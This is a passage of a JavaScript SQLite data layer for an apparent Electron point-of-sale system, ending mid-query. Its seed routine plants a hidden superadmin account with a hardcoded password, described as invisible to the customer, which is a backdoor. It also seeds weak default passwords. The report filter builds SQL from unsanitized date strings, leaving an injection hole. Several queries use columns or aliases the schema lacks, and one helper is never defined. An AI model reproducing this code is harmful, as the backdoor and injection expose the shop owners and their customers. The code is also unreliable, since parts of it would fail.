// ══════════════════════════════════════════════
// database.js — Capa SQLite
// Corre SOLO en el main process de Electron
// NUNCA se expone directamente al renderer
// ══════════════════════════════════════════════

const Database = require('better-sqlite3');
const path     = require('path');
const fs       = require('fs');
const bcrypt   = require('bcryptjs');
const { app }  = require('electron');

let dataDir;
let DB_PATH;
let db;

// ══════════════════════════════════════════════
// INICIALIZAR DB
// ══════════════════════════════════════════════
function initDB(customDataDir) {
  // Usar el directorio pasado como parámetro, o calcular automáticamente
  dataDir = customDataDir || (
    app.isPackaged
      ? path.join(app.getPath('userData'), 'data')
      : path.join(__dirname, 'data')
  );

  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  DB_PATH = path.join(dataDir, 'velo.db');
  db = new Database(DB_PATH);

  // Rendimiento y seguridad
  db.pragma('journal_mode = WAL');
  db.pragma('foreign_keys = ON');
  db.pragma('synchronous = NORMAL');

  createTables();
  seedIfEmpty();

  console.log('[DB] Iniciada en:', DB_PATH);
  return db;
}

// ══════════════════════════════════════════════
// CREAR TABLAS
// ══════════════════════════════════════════════
function createTables() {
  db.exec(`
    -- ── Configuración del negocio ──
    CREATE TABLE IF NOT EXISTS settings (
      key   TEXT PRIMARY KEY,
      value TEXT NOT NULL,
      updated_at TEXT DEFAULT (datetime('now'))
    );

    -- ── Usuarios ──
    CREATE TABLE IF NOT EXISTS users (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      name       TEXT NOT NULL,
      email      TEXT UNIQUE NOT NULL,
      password   TEXT NOT NULL,
      role       TEXT NOT NULL CHECK(role IN ('admin','cajero','superadmin')),
      avatar     TEXT DEFAULT '',
      active     INTEGER DEFAULT 1,
      created_at TEXT DEFAULT (datetime('now')),
      updated_at TEXT DEFAULT (datetime('now'))
    );

    -- ── Categorías ──
    CREATE TABLE IF NOT EXISTS categories (
      id   INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT UNIQUE NOT NULL
    );

    -- ── Productos ──
    CREATE TABLE IF NOT EXISTS products (
      id            INTEGER PRIMARY KEY AUTOINCREMENT,
      code          TEXT UNIQUE NOT NULL,
      name          TEXT NOT NULL,
      brand         TEXT DEFAULT '',
      category      TEXT DEFAULT '',
      description   TEXT DEFAULT '',
      cost          REAL NOT NULL DEFAULT 0,
      price         REAL NOT NULL DEFAULT 0,
      wholesale     REAL NOT NULL DEFAULT 0,
      stock         INTEGER NOT NULL DEFAULT 0,
      stock_min     INTEGER NOT NULL DEFAULT 5,
      unit          TEXT DEFAULT 'und',
      active        INTEGER DEFAULT 1,
      created_at    TEXT DEFAULT (datetime('now')),
      updated_at    TEXT DEFAULT (datetime('now'))
    );

    -- ── Movimientos de inventario ──
    CREATE TABLE IF NOT EXISTS inventory_movements (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      product_id INTEGER NOT NULL REFERENCES products(id),
      type       TEXT NOT NULL CHECK(type IN ('entrada','salida','ajuste','devolucion','dano','perdida')),
      qty        INTEGER NOT NULL,
      qty_before INTEGER NOT NULL,
      qty_after  INTEGER NOT NULL,
      reason     TEXT DEFAULT '',
      sale_id    INTEGER,
      user_id    INTEGER REFERENCES users(id),
      created_at TEXT DEFAULT (datetime('now'))
    );

    -- ── Clientes ──
    CREATE TABLE IF NOT EXISTS customers (
      id             INTEGER PRIMARY KEY AUTOINCREMENT,
      name           TEXT NOT NULL,
      rnc            TEXT DEFAULT '',
      phone          TEXT DEFAULT '',
      address        TEXT DEFAULT '',
      email          TEXT DEFAULT '',
      credit_limit   REAL DEFAULT 0,
      credit_days    INTEGER DEFAULT 30,
      balance        REAL DEFAULT 0,
      credit_due     TEXT DEFAULT NULL,
      status         TEXT DEFAULT 'activo' CHECK(status IN ('activo','bloqueado','moroso')),
      active         INTEGER DEFAULT 1,
      created_at     TEXT DEFAULT (datetime('now')),
      updated_at     TEXT DEFAULT (datetime('now'))
    );

    -- ── Sesiones de caja ──
    CREATE TABLE IF NOT EXISTS cash_sessions (
      id           INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id      INTEGER NOT NULL REFERENCES users(id),
      cajero       TEXT NOT NULL,
      open_date    TEXT NOT NULL,
      open_time    TEXT NOT NULL,
      close_date   TEXT,
      close_time   TEXT,
      open_amount  REAL NOT NULL DEFAULT 0,
      close_amount REAL DEFAULT 0,
      expected     REAL DEFAULT 0,
      difference   REAL DEFAULT 0,
      status       TEXT DEFAULT 'open' CHECK(status IN ('open','closed')),
      open_bills   TEXT DEFAULT '{}',
      close_bills  TEXT DEFAULT '{}',
      notes        TEXT DEFAULT '',
      sales_count  INTEGER DEFAULT 0,
      sales_total  REAL DEFAULT 0,
      created_at   TEXT DEFAULT (datetime('now'))
    );

    -- ── Movimientos de caja ──
    CREATE TABLE IF NOT EXISTS cash_movements (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      cash_session_id INTEGER NOT NULL REFERENCES cash_sessions(id),
      type            TEXT NOT NULL CHECK(type IN ('venta','abono','entrada','salida','devolucion')),
      amount          REAL NOT NULL,
      method          TEXT DEFAULT 'efectivo',
      reference_id    INTEGER,
      description     TEXT DEFAULT '',
      user_id         INTEGER REFERENCES users(id),
      created_at      TEXT DEFAULT (datetime('now'))
    );

    -- ── Ventas ──
    CREATE TABLE IF NOT EXISTS sales (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      cash_session_id INTEGER REFERENCES cash_sessions(id),
      customer_id     INTEGER REFERENCES customers(id),
      customer_name   TEXT DEFAULT 'Consumidor Final',
      customer_rnc    TEXT DEFAULT '',
      type            TEXT DEFAULT 'factura' CHECK(type IN ('factura','cotizacion','devolucion')),
      status          TEXT DEFAULT 'completed' CHECK(status IN ('completed','cancelled','returned')),
      subtotal        REAL NOT NULL DEFAULT 0,
      discount_pct    REAL DEFAULT 0,
      discount_amt    REAL DEFAULT 0,
      tax_pct         REAL DEFAULT 18,
      tax_amt         REAL DEFAULT 0,
      total           REAL NOT NULL DEFAULT 0,
      payment_method  TEXT DEFAULT 'efectivo',
      price_mode      TEXT DEFAULT 'retail' CHECK(price_mode IN ('retail','wholesale')),
      cajero          TEXT DEFAULT '',
      user_id         INTEGER REFERENCES users(id),
      notes           TEXT DEFAULT '',
      cancelled_at    TEXT,
      cancel_reason   TEXT DEFAULT '',
      original_sale_id INTEGER,
      created_at      TEXT DEFAULT (datetime('now'))
    );

    -- ── Detalle de ventas (snapshot histórico) ──
    CREATE TABLE IF NOT EXISTS sale_items (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      sale_id     INTEGER NOT NULL REFERENCES sales(id),
      product_id  INTEGER REFERENCES products(id),
      product_code TEXT NOT NULL,
      product_name TEXT NOT NULL,
      -- Snapshot: estos valores NO cambian aunque cambie el producto
      unit_cost   REAL NOT NULL DEFAULT 0,
      unit_price  REAL NOT NULL DEFAULT 0,
      qty         INTEGER NOT NULL DEFAULT 1,
      subtotal    REAL NOT NULL DEFAULT 0
    );

    -- ── Pagos / Abonos ──
    CREATE TABLE IF NOT EXISTS payments (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      customer_id INTEGER NOT NULL REFERENCES customers(id),
      sale_id     INTEGER REFERENCES sales(id),
      amount      REAL NOT NULL,
      method      TEXT DEFAULT 'efectivo',
      note        TEXT DEFAULT '',
      balance_before REAL DEFAULT 0,
      balance_after  REAL DEFAULT 0,
      cajero      TEXT DEFAULT '',
      user_id     INTEGER REFERENCES users(id),
      created_at  TEXT DEFAULT (datetime('now'))
    );

    -- ── Auditoría ──
    CREATE TABLE IF NOT EXISTS audit_logs (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id    INTEGER REFERENCES users(id),
      user_name  TEXT DEFAULT '',
      action     TEXT NOT NULL,
      entity     TEXT DEFAULT '',
      entity_id  INTEGER,
      detail     TEXT DEFAULT '',
      created_at TEXT DEFAULT (datetime('now'))
    );

    -- ── Trabajos de impresión ──
    CREATE TABLE IF NOT EXISTS print_jobs (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      type        TEXT NOT NULL,
      reference_id INTEGER,
      status      TEXT DEFAULT 'pending' CHECK(status IN ('pending','success','failed')),
      error       TEXT DEFAULT '',
      reprinted   INTEGER DEFAULT 0,
      printer     TEXT DEFAULT '',
      user_id     INTEGER REFERENCES users(id),
      created_at  TEXT DEFAULT (datetime('now'))
    );

    -- ── Índices ──
    CREATE INDEX IF NOT EXISTS idx_sales_date        ON sales(created_at);
    CREATE INDEX IF NOT EXISTS idx_sales_customer    ON sales(customer_id);
    CREATE INDEX IF NOT EXISTS idx_sales_session     ON sales(cash_session_id);
    CREATE INDEX IF NOT EXISTS idx_sale_items_sale   ON sale_items(sale_id);
    CREATE INDEX IF NOT EXISTS idx_payments_customer ON payments(customer_id);
    CREATE INDEX IF NOT EXISTS idx_audit_user        ON audit_logs(user_id);
    CREATE INDEX IF NOT EXISTS idx_audit_action      ON audit_logs(action);
    CREATE INDEX IF NOT EXISTS idx_inv_product       ON inventory_movements(product_id);
  `);
}

// ══════════════════════════════════════════════
// SEED INICIAL
// ══════════════════════════════════════════════
function seedIfEmpty() {
  const userCount = db.prepare('SELECT COUNT(*) as c FROM users').get().c;
  if (userCount > 0) {
    // Siempre verificar que el superadmin existe aunque la DB no sea nueva
    _ensureSuperAdmin();
    return;
  }

  console.log('[DB] Insertando datos iniciales...');

  const insertSetting = db.prepare('INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)');
  [
    ['biz_name',    'Mi Negocio'],
    ['biz_rnc',     ''],
    ['biz_addr',    ''],
    ['biz_phone',   ''],
    ['tax_pct',          '18'],
    ['currency',         'RD$'],
    ['printer',          ''],
    ['receipt_msg',      '¡Gracias por su compra!'],
    ['password_changed', '0'],
    ['ncf_counter',      '0'],
  ].forEach(([k, v]) => insertSetting.run(k, v));

  const adminPass  = bcrypt.hashSync('admin123', 10);
  const cajeroPass = bcrypt.hashSync('caja123',  10);

  db.prepare(`
    INSERT INTO users(name,email,password,role,avatar) VALUES(?,?,?,?,?)
  `).run('Administrador', 'admin@mipos.do', adminPass,  'admin',  'AD');

  db.prepare(`
    INSERT INTO users(name,email,password,role,avatar) VALUES(?,?,?,?,?)
  `).run('Cajero', 'caja@mipos.do', cajeroPass, 'cajero', 'CA');

  ['Filtros','Eléctrico','Frenos','Suspensión','Motor',
   'Lubricantes','Encendido','Enfriamiento','Transmisión','Otros'].forEach(cat => {
    db.prepare('INSERT OR IGNORE INTO categories(name) VALUES(?)').run(cat);
  });

  db.prepare(`
    INSERT INTO customers(name,rnc,credit_limit,balance,active)
    VALUES('Consumidor Final','',0,0,1)
  `).run();

  // Crear superadmin
  _ensureSuperAdmin();

  console.log('[DB] Sistema listo para usar.');
}

// ── Super Admin (desarrollador) ───────────────
// Siempre existe, no aparece en la UI del cliente
// Email y contraseña solo conocidos por el desarrollador
function _ensureSuperAdmin() {
  const existing = db.prepare(`SELECT id FROM users WHERE email=?`)
    .get('dev@sistema.do');
  if (!existing) {
    const hash = bcrypt.hashSync('Sp3r@Dev#2026!', 10);
    db.prepare(`
      INSERT INTO users(name,email,password,role,avatar,active)
      VALUES(?,?,?,?,?,1)
    `).run('Super Admin', 'dev@sistema.do', hash, 'superadmin', 'SA');
    console.log('[DB] Super Admin inicializado.');
  }
}

// ══════════════════════════════════════════════
// HELPERS
// ══════════════════════════════════════════════
function audit(userId, userName, action, entity = '', entityId = null, detail = '') {
  db.prepare(`
    INSERT INTO audit_logs(user_id,user_name,action,entity,entity_id,detail)
    VALUES(?,?,?,?,?,?)
  `).run(userId, userName, action, entity, entityId, detail);
}

function todayStr() {
  return new Date().toISOString().split('T')[0];
}

function nowStr() {
  return new Date().toLocaleTimeString('es-DO', { hour: '2-digit', minute: '2-digit' });
}

// ══════════════════════════════════════════════
// REPOSITORIOS
// ══════════════════════════════════════════════

// ── Auth ──────────────────────────────────────
const authRepo = {
  findByEmail(email) {
    return db.prepare('SELECT * FROM users WHERE email=? AND active=1').get(email);
  },
  findById(id) {
    return db.prepare('SELECT * FROM users WHERE id=?').get(id);
  },
  verifyPassword(plain, hash) {
    return bcrypt.compareSync(plain, hash);
  },
};

// ── Settings ──────────────────────────────────
const settingsRepo = {
  getAll() {
    const rows = db.prepare('SELECT key,value FROM settings').all();
    const obj  = {};
    rows.forEach(r => { obj[r.key] = r.value; });
    return obj;
  },
  get(key) {
    const r = db.prepare('SELECT value FROM settings WHERE key=?').get(key);
    return r ? r.value : null;
  },
  set(key, value) {
    db.prepare(`
      INSERT INTO settings(key,value,updated_at)
      VALUES(?,?,datetime('now'))
      ON CONFLICT(key) DO UPDATE SET value=excluded.value, updated_at=excluded.updated_at
    `).run(key, String(value));
  },
};

// ── Usuarios ──────────────────────────────────
const usersRepo = {
  getAll() {
    return db.prepare('SELECT id,name,email,role,avatar,active,created_at FROM users ORDER BY name').all();
  },
  create({ name, email, password, role, avatar = '' }) {
    const hash = bcrypt.hashSync(password, 10);
    const r = db.prepare(`
      INSERT INTO users(name,email,password,role,avatar) VALUES(?,?,?,?,?)
    `).run(name, email.toLowerCase(), hash, role, avatar);
    return r.lastInsertRowid;
  },
  update(id, { name, email, role, avatar, active }) {
    db.prepare(`
      UPDATE users SET name=?,email=?,role=?,avatar=?,active=?,updated_at=datetime('now')
      WHERE id=?
    `).run(name, email.toLowerCase(), role, avatar, active ? 1 : 0, id);
  },
  changePassword(id, newPassword) {
    const hash = bcrypt.hashSync(newPassword, 10);
    db.prepare(`UPDATE users SET password=?,updated_at=datetime('now') WHERE id=?`).run(hash, id);
  },
};

// ── Productos ─────────────────────────────────
const productsRepo = {
  getAll() {
    return db.prepare('SELECT * FROM products WHERE active=1 ORDER BY name').all();
  },
  getById(id) {
    return db.prepare('SELECT * FROM products WHERE id=?').get(id);
  },
  create(p) {
    const r = db.prepare(`
      INSERT INTO products(code,barcode,name,brand,category,description,cost,price,wholesale,stock,stock_min,unit,condition)
      VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)
    `).run(p.code,p.barcode||'',p.name,p.brand||'',p.category||'',p.description||'',
           p.cost,p.price,p.wholesale||p.price,p.stock||0,p.stock_min||5,p.unit||'und',
           p.condition||'nuevo');
    return r.lastInsertRowid;
  },
  update(id, p) {
    db.prepare(`
      UPDATE products SET code=?,barcode=?,name=?,brand=?,category=?,description=?,
      cost=?,price=?,wholesale=?,stock_min=?,unit=?,condition=?,updated_at=datetime('now')
      WHERE id=?
    `).run(p.code,p.barcode||'',p.name,p.brand||'',p.category||'',p.description||'',
           p.cost,p.price,p.wholesale||p.price,p.stock_min||5,p.unit||'und',
           p.condition||'nuevo',id);
  },
  adjustStock(id, qty, type, reason, saleId = null, userId = null) {
    const prod = db.prepare('SELECT stock FROM products WHERE id=?').get(id);
    if (!prod) throw new Error('Producto no encontrado');
    const before = prod.stock;
    const after  = before + qty;
    if (after < 0) throw new Error('Stock insuficiente');
    db.prepare('UPDATE products SET stock=?,updated_at=datetime(\'now\') WHERE id=?').run(after, id);
    db.prepare(`
      INSERT INTO inventory_movements(product_id,type,qty,qty_before,qty_after,reason,sale_id,user_id)
      VALUES(?,?,?,?,?,?,?,?)
    `).run(id, type, qty, before, after, reason, saleId, userId);
    return { before, after };
  },
  delete(id) {
    db.prepare('UPDATE products SET active=0,updated_at=datetime(\'now\') WHERE id=?').run(id);
  },
  getMovements(productId) {
    return db.prepare(`
      SELECT m.*, u.name as user_name
      FROM inventory_movements m
      LEFT JOIN users u ON m.user_id = u.id
      WHERE m.product_id=?
      ORDER BY m.created_at DESC
    `).all(productId);
  },
};

// ── Clientes ──────────────────────────────────
const customersRepo = {
  getAll() {
    return db.prepare('SELECT * FROM customers WHERE active=1 ORDER BY name').all();
  },
  getById(id) {
    return db.prepare('SELECT * FROM customers WHERE id=?').get(id);
  },
  create(c) {
    const r = db.prepare(`
      INSERT INTO customers(name,rnc,phone,address,email,credit_limit,credit_days)
      VALUES(?,?,?,?,?,?,?)
    `).run(c.name,c.rnc||'',c.phone||'',c.address||'',c.email||'',c.credit_limit||0,c.credit_days||30);
    return r.lastInsertRowid;
  },
  update(id, c) {
    db.prepare(`
      UPDATE customers SET name=?,rnc=?,phone=?,address=?,email=?,
      credit_limit=?,credit_days=?,status=?,updated_at=datetime('now')
      WHERE id=?
    `).run(c.name,c.rnc||'',c.phone||'',c.address||'',c.email||'',
           c.credit_limit||0,c.credit_days||30,c.status||'activo',id);
  },
  addPayment({ customerId, amount, method, note, saleId = null, cajero = '', userId = null, sessionId = null }) {
    const cust = db.prepare('SELECT balance,credit_due FROM customers WHERE id=?').get(customerId);
    if (!cust) throw new Error('Cliente no encontrado');
    const before = cust.balance;
    const after  = Math.max(0, before - amount);
    const payTx = db.transaction(() => {
      db.prepare(`
        INSERT INTO payments(customer_id,sale_id,amount,method,note,balance_before,balance_after,cajero,user_id,cash_session_id)
        VALUES(?,?,?,?,?,?,?,?,?,?)
      `).run(customerId, saleId, amount, method, note||'Abono', before, after, cajero, userId, sessionId || null);
      db.prepare(`
        UPDATE customers SET balance=?,credit_due=?,updated_at=datetime('now') WHERE id=?
      `).run(after, after <= 0 ? null : cust.credit_due, customerId);
      // Registrar en movimientos de caja si hay sesión activa y el método es efectivo/transferencia/tarjeta
      if (sessionId && method !== 'credito') {
        db.prepare(`
          INSERT INTO cash_movements(cash_session_id,type,amount,method,reference_id,description,user_id)
          VALUES(?,?,?,?,?,?,?)
        `).run(sessionId, 'abono', amount, method || 'efectivo', saleId, `Abono cliente`, userId);
      }
      return { before, after, amount };
    });
    return payTx();
  },
  getPayments(customerId) {
    return db.prepare(`
      SELECT * FROM payments WHERE customer_id=? ORDER BY created_at DESC
    `).all(customerId);
  },
};

// ── Caja ──────────────────────────────────────
const cashRepo = {
  getOpen() {
    return db.prepare("SELECT * FROM cash_sessions WHERE status='open' LIMIT 1").get();
  },
  open({ userId, cajero, openAmount, openBills }) {
    const r = db.prepare(`
      INSERT INTO cash_sessions(user_id,cajero,open_date,open_time,open_amount,open_bills,status)
      VALUES(?,?,?,?,?,?,'open')
    `).run(userId, cajero, todayStr(), nowStr(), openAmount, JSON.stringify(openBills || {}));
    audit(userId, cajero, 'apertura_caja', 'cash_sessions', r.lastInsertRowid,
          `Fondo: ${openAmount}`);
    return r.lastInsertRowid;
  },
  close({ sessionId, closeAmount, closeBills, expected, notes, userId, cajero }) {
    const diff = closeAmount - expected;
    db.prepare(`
      UPDATE cash_sessions SET
        close_date=?, close_time=?, close_amount=?, close_bills=?,
        expected=?, difference=?, notes=?, status='closed'
      WHERE id=?
    `).run(todayStr(), nowStr(), closeAmount, JSON.stringify(closeBills || {}),
           expected, diff, notes || '', sessionId);
    audit(userId, cajero, 'cierre_caja', 'cash_sessions', sessionId,
          `Contado: ${closeAmount} | Esperado: ${expected} | Diferencia: ${diff}`);
    return { diff };
  },
  addMovement({ sessionId, type, amount, method, referenceId, description, userId }) {
    db.prepare(`
      INSERT INTO cash_movements(cash_session_id,type,amount,method,reference_id,description,user_id)
      VALUES(?,?,?,?,?,?,?)
    `).run(sessionId, type, amount, method || 'efectivo', referenceId, description || '', userId);
  },
  getSessions(limit = 30) {
    return db.prepare(`
      SELECT cs.*, u.name as user_name
      FROM cash_sessions cs
      LEFT JOIN users u ON cs.user_id = u.id
      ORDER BY cs.id DESC LIMIT ?
    `).all(limit);
  },
  getSessionSales(sessionId) {
    return db.prepare(`
      SELECT s.*, si.product_name, si.qty, si.unit_price
      FROM sales s
      WHERE s.cash_session_id=? AND s.status != 'cancelled'
      ORDER BY s.id DESC
    `).all(sessionId);
  },
  updateTotals(sessionId, total) {
    db.prepare(`
      UPDATE cash_sessions
      SET sales_total = sales_total + ?,
          sales_count = sales_count + 1
      WHERE id=?
    `).run(total, sessionId);
  },
};

// ── Ventas ────────────────────────────────────
const salesRepo = {
  // Transacción completa de venta
  create({ session, customer, items, payment, user, type = 'factura' }) {
    const createSaleTx = db.transaction(() => {
      // 1. Calcular totales
      const subtotal   = items.reduce((a, i) => a + i.unit_price * i.qty, 0);
      const discPct    = payment.disc || 0;
      const discAmt    = subtotal * (discPct / 100);
      const base       = subtotal - discAmt;
      const taxPctSetting = db.prepare("SELECT value FROM settings WHERE key='tax_pct'").get();
      const taxPct     = type === 'factura' ? parseFloat(taxPctSetting?.value ?? 18) : 0;
      const taxAmt     = base * (taxPct / 100);
      const total      = base + taxAmt;

      // 2. Validar stock
      for (const item of items) {
        const prod = db.prepare('SELECT stock,name FROM products WHERE id=?').get(item.product_id);
        if (!prod) throw new Error(`Producto ID ${item.product_id} no existe`);
        if (prod.stock < item.qty && type !== 'cotizacion') {
          throw new Error(`Stock insuficiente para "${prod.name}"`);
        }
      }

      // 3. Validar crédito
      if (payment.method === 'credito' && customer.id !== 1) {
        const cust = db.prepare('SELECT balance,credit_limit,status FROM customers WHERE id=?').get(customer.id);
        if (!cust) throw new Error('Cliente no encontrado');
        if (cust.status === 'bloqueado') {
          throw new Error('Cliente bloqueado — no puede comprar a crédito');
        }
        if (cust.status === 'moroso') {
          throw new Error('Cliente marcado como moroso — no puede comprar a crédito');
        }
        if (cust.balance + total > cust.credit_limit) {
          throw new Error(`Límite de crédito excedido. Disponible: ${cust.credit_limit - cust.balance}`);
        }
      }

      // 4. Crear venta
      const saleR = db.prepare(`
        INSERT INTO sales(cash_session_id,customer_id,customer_name,customer_rnc,
          type,status,subtotal,discount_pct,discount_amt,tax_pct,tax_amt,total,
          payment_method,price_mode,cajero,user_id)
        VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
      `).run(
        session?.id || null,
        customer.id,
        customer.name || 'Consumidor Final',
        customer.rnc  || '',
        type, 'completed',
        subtotal, discPct, discAmt, taxPct, taxAmt, total,
        payment.method || 'efectivo',
        payment.priceMode || 'retail',
        user.name || '',
        user.id
      );
      const saleId = saleR.lastInsertRowid;

      // 4b. Generar NCF con contador independiente (solo facturas)
      let ncf = '';
      if (type === 'factura') {
        const counterRow = db.prepare("SELECT value FROM settings WHERE key='ncf_counter'").get();
        const nextNum = (parseInt(counterRow?.value || 0, 10)) + 1;
        ncf = 'B01' + String(nextNum).padStart(9, '0');
        db.prepare("UPDATE settings SET value=?, updated_at=datetime('now') WHERE key='ncf_counter'")
          .run(String(nextNum));
        db.prepare("UPDATE sales SET ncf=? WHERE id=?").run(ncf, saleId);
      }

      // 5. Insertar items con snapshot
      for (const item of items) {
        db.prepare(`
          INSERT INTO sale_items(sale_id,product_id,product_code,product_name,unit_cost,unit_price,qty,subtotal)
          VALUES(?,?,?,?,?,?,?,?)
        `).run(saleId, item.product_id, item.product_code, item.product_name,
               item.unit_cost, item.unit_price, item.qty, item.unit_price * item.qty);

        // 6. Descontar stock (solo factura o crédito)
        if (type === 'factura' || payment.method === 'credito') {
          productsRepo.adjustStock(item.product_id, -item.qty, 'salida',
            `Venta #${saleId}`, saleId, user.id);
        }
      }

      // 7. Actualizar crédito del cliente
      if (payment.method === 'credito' && customer.id !== 1) {
        const ci = db.prepare('SELECT balance,credit_days FROM customers WHERE id=?').get(customer.id);
        const newBalance = (ci.balance || 0) + total;
        const dueDate = ci.credit_due && ci.credit_due >= todayStr()
          ? ci.credit_due
          : addDaysStr(todayStr(), ci.credit_days || 30);
        db.prepare(`
          UPDATE customers SET balance=?,credit_due=?,updated_at=datetime('now') WHERE id=?
        `).run(newBalance, dueDate, customer.id);
      }

      // 8. Movimiento de caja
      if (session?.id && payment.method !== 'credito') {
        if (payment.method === 'mixto') {
          // Registrar dos movimientos separados para pago mixto
          if ((payment.mixEfec || 0) > 0) {
            cashRepo.addMovement({
              sessionId: session.id, type: 'venta',
              amount: payment.mixEfec, method: 'efectivo',
              referenceId: saleId,
              description: `Venta #${saleId} (efectivo)`,
              userId: user.id
            });
          }
          if ((payment.mixCard || 0) > 0) {
            cashRepo.addMovement({
              sessionId: session.id, type: 'venta',
              amount: payment.mixCard, method: 'tarjeta',
              referenceId: saleId,
              description: `Venta #${saleId} (tarjeta/trans.)`,
              userId: user.id
            });
          }
        } else {
          cashRepo.addMovement({
            sessionId: session.id, type: 'venta',
            amount: total, method: payment.method,
            referenceId: saleId,
            description: `Venta #${saleId}`,
            userId: user.id
          });
        }
      }

      // 9. Actualizar totales de sesión
      if (session?.id) {
        cashRepo.updateTotals(session.id, total);
      }

      // 10. Auditoría
      audit(user.id, user.name, 'venta_creada', 'sales', saleId,
            `Total: ${total} | Método: ${payment.method} | Items: ${items.length}`);

      return { saleId, total, subtotal, taxAmt, discAmt, ncf };
    });

    return createSaleTx(); // Si algo falla, revierte TODO
  },

  getById(id) {
    const sale  = db.prepare('SELECT * FROM sales WHERE id=?').get(id);
    if (!sale) return null;
    sale.items  = db.prepare('SELECT * FROM sale_items WHERE sale_id=?').all(id);
    return sale;
  },

  getAll({ range = 'today', customerId, method, limit = 200 } = {}) {
    let where = "WHERE s.status != 'cancelled'";
    const params = [];
    if (range === 'today') {
      where += ` AND date(s.created_at)=date('now','localtime')`;
    } else if (range === 'week') {
      where += ` AND date(s.created_at)>=date('now','-7 days','localtime')`;
    } else if (range === 'month') {
      where += ` AND strftime('%Y-%m',s.created_at)=strftime('%Y-%m','now','localtime')`;
    }
    if (customerId) { where += ' AND s.customer_id=?'; params.push(customerId); }
    if (method)     { where += ' AND s.payment_method=?'; params.push(method); }
    params.push(limit);
    return db.prepare(`
      SELECT s.*, GROUP_CONCAT(si.product_name || ' x' || si.qty, ' | ') as items_summary
      FROM sales s
      LEFT JOIN sale_items si ON s.id = si.sale_id
      ${where}
      GROUP BY s.id
      ORDER BY s.id DESC
      LIMIT ?
    `).all(...params);
  },

  cancel(id, reason, userId, userName) {
    const sale = db.prepare('SELECT * FROM sales WHERE id=?').get(id);
    if (!sale) throw new Error('Venta no encontrada');
    if (sale.status === 'cancelled') throw new Error('Venta ya está cancelada');

    const cancelTx = db.transaction(() => {
      db.prepare(`
        UPDATE sales SET status='cancelled',cancelled_at=datetime('now'),cancel_reason=? WHERE id=?
      `).run(reason, id);

      // Reponer stock
      const items = db.prepare('SELECT * FROM sale_items WHERE sale_id=?').all(id);
      for (const item of items) {
        if (sale.type === 'factura' || sale.payment_method === 'credito') {
          productsRepo.adjustStock(item.product_id, item.qty, 'devolucion',
            `Anulación venta #${id}`, id, userId);
        }
      }

      // Si era crédito, revertir balance
      if (sale.payment_method === 'credito' && sale.customer_id !== 1) {
        const cust = db.prepare('SELECT balance FROM customers WHERE id=?').get(sale.customer_id);
        const newBal = Math.max(0, (cust?.balance || 0) - sale.total);
        db.prepare('UPDATE customers SET balance=? WHERE id=?').run(newBal, sale.customer_id);
      }

      audit(userId, userName, 'venta_anulada', 'sales', id, `Motivo: ${reason}`);
    });

    cancelTx();
  },
};

// ── Reportes ──────────────────────────────────
const reportsRepo = {
  summary(range = 'today', dateFrom = null, dateTo = null) {
    let dateFilter;   // con alias s (para queries con JOIN)
    let dateFilterNoAlias; // sin alias (para queries directas sobre sales)
    if (range === 'custom' && dateFrom && dateTo) {
      dateFilter        = `date(s.created_at) BETWEEN '${dateFrom}' AND '${dateTo}'`;
      dateFilterNoAlias = `date(created_at) BETWEEN '${dateFrom}' AND '${dateTo}'`;
    } else if (range === 'week') {
      dateFilter        = `date(s.created_at) >= date('now','-7 days','localtime')`;
      dateFilterNoAlias = `date(created_at) >= date('now','-7 days','localtime')`;
    } else if (range === 'month') {
      dateFilter        = `strftime('%Y-%m',s.created_at) = strftime('%Y-%m','now','localtime')`;
      dateFilterNoAlias = `strftime('%Y-%m',created_at) = strftime('%Y-%m','now','localtime')`;
    } else if (range === 'all') {
      dateFilter        = `1=1`;
      dateFilterNoAlias = `1=1`;
    } else {
      // today
      dateFilter        = `date(s.created_at) = date('now','localtime')`;
      dateFilterNoAlias = `date(created_at) = date('now','localtime')`;
    }

    // Ventas por método de pago
    const byMethod = db.prepare(`
      SELECT payment_method, COUNT(*) as count,
             SUM(total) as total, SUM(tax_amt) as tax,
             SUM(discount_amt) as discount
      FROM sales
      WHERE status='completed' AND type != 'devolucion' AND ${dateFilterNoAlias}
      GROUP BY payment_method
    `).all();

    // Costo total de lo vendido (desde snapshot de sale_items)
    const costData = db.prepare(`
      SELECT SUM(si.unit_cost * si.qty) as total_cost,
             SUM(si.unit_price * si.qty) as total_rev_items,
             COUNT(DISTINCT s.id) as total_sales,
             SUM(si.qty) as total_units
      FROM sale_items si
      JOIN sales s ON si.sale_id = s.id
      WHERE s.status='completed' AND s.type != 'devolucion' AND ${dateFilter}
    `).get();

    // Devoluciones
    const devData = db.prepare(`
      SELECT COUNT(*) as count, SUM(total) as total
      FROM sales
      WHERE type='devolucion' AND ${dateFilterNoAlias}
    `).get();

    // Descuentos totales
    const discData = db.prepare(`
      SELECT SUM(discount_amt) as total_discount
      FROM sales
      WHERE status='completed' AND type != 'devolucion' AND ${dateFilterNoAlias}
    `).get();

    // ITBIS total
    const taxData = db.prepare(`
      SELECT SUM(tax_amt) as total_tax
      FROM sales
      WHERE status='completed' AND type != 'devolucion' AND ${dateFilterNoAlias}
    `).get();

    // Productos más vendidos (con ganancia real)
    const topProducts = db.prepare(`
      SELECT si.product_name, si.product_code,
             SUM(si.qty) as total_qty,
             SUM(si.unit_price * si.qty) as total_rev,
             SUM(si.unit_cost  * si.qty) as total_cost,
             SUM((si.unit_price - si.unit_cost) * si.qty) as total_profit
      FROM sale_items si
      JOIN sales s ON si.sale_id = s.id
      WHERE s.status='completed' AND s.type != 'devolucion' AND ${dateFilter}
      GROUP BY si.product_id
      ORDER BY total_rev DESC LIMIT 10
    `).all();

    // Ventas por día (últimos 30 o en rango)
    const dailySales = db.prepare(`
      SELECT date(s.created_at,'localtime') as day,
             COUNT(*) as count,
             SUM(s.total) as total,
